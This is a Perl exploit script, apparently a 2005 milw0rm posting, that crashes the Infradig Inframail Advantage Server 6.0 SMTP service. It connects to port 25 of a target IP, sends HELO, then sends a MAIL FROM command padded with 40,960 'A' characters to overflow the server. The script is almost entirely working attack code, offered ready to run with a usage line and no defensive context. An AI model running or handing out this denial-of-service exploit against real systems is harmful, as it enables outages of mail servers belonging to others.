#===== Start Inframail_SMTPOverflow.pl =====
#
# Usage: Inframail_SMTPOverflow.pl <ip>
#        Inframail_SMTPOverflow.pl 127.0.0.1
#
# Infradig Systems Inframail Advantage Server Edition 6.0
# (Version: 6.37)
#
# Download:
# http://www.infradig.com/
#
#########################################################

use IO::Socket;
use strict;

my($socket) = "";

if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                    PeerPort => "25",
                                    Proto    => "TCP"))
{
        print "Attempting to kill Inframail SMTP server at $ARGV[0]:25...";

        sleep(1);

        print $socket "HELO moto.com\r\n";

        sleep(1);

        print $socket "MAIL FROM:" . "A" x 40960 . "\r\n";

        close($socket);
}
else
{
        print "Cannot connect to $ARGV[0]:25\n";
}
#===== End Inframail_SMTPOverflow.pl =====

# milw0rm.com [2005-06-27]
